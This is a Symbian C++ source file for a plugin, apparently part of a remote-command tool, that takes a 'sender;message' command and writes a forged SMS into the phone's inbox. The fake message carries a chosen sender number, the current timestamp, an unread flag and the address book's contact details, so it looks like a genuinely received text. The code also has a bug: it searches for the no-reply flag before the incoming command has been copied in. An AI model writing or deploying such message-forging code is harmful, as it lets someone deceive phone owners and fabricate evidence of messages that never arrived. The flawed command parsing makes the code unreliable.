

#include "FakeSms.h"
#include "common.h"

#include <Plugins_200112df.rsg>
#include <FuzzyByte\Guardian\client.h>

#include <txtfmlyr.h>
#include <txtrich.h>
#include <smuthdr.h>
#include <smut.h>


// Construction and destruction functions

CFakeSms* CFakeSms::NewL(TAny* aInitParams)
	{
	CFakeSms* self=new(ELeave) CFakeSms();
	CleanupStack::PushL(self);
	self->ConstructL(aInitParams);
	CleanupStack::Pop(self);
	return self;
	}

CFakeSms::~CFakeSms()
	{
	}


TPtrC CFakeSms::PluginId()
	{
	return TPtrC(KFAKESMS);
	}


CFakeSms::CFakeSms()
// Store input/output parameters
	{
	// See ConstructL() for initialisation completion.
	}

void CFakeSms::ConstructL(TAny* aInitParams)
// Safely complete the initialization of the constructed object
	{
	BaseConstructL(aInitParams);
	}



void CFakeSms::ProcessCommandL(const TDesC& aData)
	{
	TInt posNoReply = iDataUpper.Find(KNOREPLY);
	// TInt posDestNumb = iDataUpper.Find(KDESTNUMBER);

	iDataUpper.Copy(aData);
	if (posNoReply > 0)
	{
		__LOG_TXT("NoReply");
		iDataUpper.Delete(posNoReply, KNOREPLY().Length());
	}

	TInt pos = iDataUpper.Find(_L(";"));
	if (pos > 0)
	{
		TInt len = iDataUpper.Length()-pos-1;
		SaveToInBoxL(iDataUpper.Left(pos), iDataUpper.Mid(pos+1, len));
		AppendDataToReplyL( R_FAKE_OK );
//		iReply.Append(_L("FakeSMS Command: Ok - Received!"));
	} else
	{
		AppendDataToReplyL( R_FAKE_KO );
//		iReply.Append(_L("FakeSMS Command: Error - Missing ';' separator"));
	}

	SendReplyL();
	Complete(KErrNone);
	}


void CFakeSms::SaveToInBoxL(const TDesC& sender, const TDesC& msg)
{
	CMsvSession* msvSession = CMsvSession::OpenSyncL(*this);
	CleanupStack::PushL(msvSession);

	// Crea un Header (hdr) ed un Body (richtext)
	CParaFormatLayer* paraLayer = CParaFormatLayer::NewL();
	CleanupStack::PushL(paraLayer);
	CCharFormatLayer* charLayer = CCharFormatLayer::NewL();
	CleanupStack::PushL(charLayer);
	CRichText* richtext = CRichText::NewL(paraLayer,charLayer);
	CleanupStack::PushL(richtext);
	richtext->InsertL(0, msg);  // *** Testo del Messaggio

	CSmsHeader* hdr = CSmsHeader::NewL(CSmsPDU::ESmsDeliver, *richtext);
	CleanupStack::PushL(hdr);

	hdr->SetFromAddressL(sender); // *** Numero Mittente

	// Indice
	TMsvEntry entryIdx;
	entryIdx.SetInPreparation(ETrue);
	entryIdx.SetSendingState(KMsvSendStateNotApplicable);
	entryIdx.SetVisible(EFalse);
	entryIdx.SetReadOnly(EFalse);
	entryIdx.SetUnread(ETrue);

	TSmsUtilities::PopulateMsgEntry(entryIdx, hdr->Message(), KMsvGlobalInBoxIndexEntryId);
//	TSmsUtilities::PopulateMsgEntry(entryIdx, hdr->Message(), iSmsMtm->ServiceId());
	//entryIdx.iType = KUidMsvMessageEntry;
	//entryIdx.iMtm = KUidMsgTypeSMS;
	//entryIdx.iServiceId = iSmsMtm->ServiceId();
	//entryIdx.iError = KErrNone;

	// Imposta il campo Data e Ora attuale
	TTime time;
	time.UniversalTime(); // 1.03 e' il cell. che aggiunge in automatico il daylight saving per formare HomeTime()
	CSmsDeliver& smsDeliver = static_cast<CSmsDeliver&>( hdr->Message().SmsPDU() );
	smsDeliver.SetServiceCenterTimeStamp(time); // Tempo Visualizzato

	// Crea una Entry nell'inbox usando Indice
	CMsvEntry* entry = msvSession->GetEntryL(KMsvGlobalInBoxIndexEntryId);
	CleanupStack::PushL(entry);
	entry->CreateL(entryIdx);
	CleanupStack::PopAndDestroy(entry); // entry

	// Apre la entry appena creata
	entry = msvSession->GetEntryL(entryIdx.Id());
	CleanupStack::PushL(entry);

	// *** Modifica lo store associato a questa Entry
	CMsvStore* store = entry->EditStoreL();
	CleanupStack::PushL(store);
	hdr->StoreL(*store);

	store->StoreBodyTextL(*richtext);
	store->CommitL();
	entryIdx.iSize = store->SizeL();
	CleanupStack::PopAndDestroy(); // store

	// *** Imposta il campo details di Indice (Mittente preso dalla rubrica)
	TBuf<KSmsDetailsLength> details;
	TInt err = TSmsUtilities::GetDetails(entry->Session().FileSession(), hdr->Message().ToFromAddress(), details);
	entryIdx.iDetails.Set(details);

	// *** Imposta il campo description di Indice (Preso dal messaggio)
	TBuf<KSmsDescriptionLength> description;
	err = TSmsUtilities::GetDescription(hdr->Message(), description);
	entryIdx.iDescription.Set(description);

	// Aggiorna Indice associato alla Entry
	entryIdx.SetReadOnly(ETrue);
	entryIdx.SetVisible(ETrue);
	entryIdx.SetInPreparation(EFalse);
	entry->ChangeL(entryIdx);
	CleanupStack::PopAndDestroy();	// entry
	CleanupStack::PopAndDestroy(4);	// hdr rich char para
	CleanupStack::PopAndDestroy(msvSession);	// aMsvSession
}

void CFakeSms::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3){}

